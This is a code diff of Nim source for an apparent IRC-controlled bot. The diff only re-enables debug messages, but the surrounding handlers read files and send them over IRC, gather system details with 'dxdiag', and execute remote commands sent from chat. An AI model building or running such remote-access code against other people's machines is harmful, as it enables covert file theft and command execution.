@@ -101,7 +101,7 @@ proc cmd_get(event:IrcEvent, client:Irc, tokens:seq[string], force:bool) =
     var filename = helper_recombine(tokens,1)
 
     if fileExists(filename):
-        #if g_dbg: echo "Opening file"
+        if g_dbg: echo "Opening file"
         var file = open(filename)
         var filestr = file.readAll()
 
@@ -124,7 +124,7 @@ proc cmd_get(event:IrcEvent, client:Irc, tokens:seq[string], force:bool) =
 
         client.privmsg(event.origin, "DATA transfer complete")
     else:
-        #if g_dbg: echo "File missing"
+        if g_dbg: echo "File missing"
         client.privmsg(event.origin, "that did not work out")
 
 
@@ -153,7 +153,7 @@ proc cmd_print(event:IrcEvent, client:Irc, tokens:seq[string], force:bool) =
 
         client.privmsg(event.origin, "DATA transfer complete")
     else:
-        #if g_dbg: echo "File missing"
+        if g_dbg: echo "File missing"
         client.privmsg(event.origin, "that did not work out")
 
 
@@ -161,18 +161,18 @@ proc cmd_print(event:IrcEvent, client:Irc, tokens:seq[string], force:bool) =
 ## Runs dxdiag and sends the output text file using cmd_get
 proc cmd_dxdiag(event:IrcEvent, client:Irc) =
     client.privmsg(event.origin,"one moment")
-    #if g_dbg: echo "Starting dxdiag"
+    if g_dbg: echo "Starting dxdiag"
     var 
         cmd:string = "cmd.exe /c dxdiag /dontskip /t dxdiag_file.txt"
         outputx:string
         exitcodex:int
     (outputx,exitcodex) = execCmdEx(cmd, options = {poUsePath})
 
-    #if g_dbg: echo "Checking file"
+    if g_dbg: echo "Checking file"
     cmd_get(event, client, @["dxdiag_file.txt"], true)
     removeFile("dxdiag_file.txt")
 
-    #if g_dbg: echo "Dxdiag command done"
+    if g_dbg: echo "Dxdiag command done"
 
 
 
@@ -209,7 +209,7 @@ proc cmd_rexec(event:IrcEvent, client:Irc, tokens:seq[string]) =
         var args:string
         args = helper_recombine(tokens)
         
-        #if g_dbg: echo "ARGS: " & args
+        if g_dbg: echo "ARGS: " & args
 
         response = rexec_runCommand(args)
 
@@ -230,7 +230,7 @@ proc cmdh_handle*(event:IrcEvent, client:Irc) =
         msg = event.params[event.params.high]
         tokens:seq[string]
 
-    #if g_dbg: echo "MSG: ", msg
+    if g_dbg: echo "MSG: ", msg
 
     for token in msg.tokenize():
         if not token.isSep:
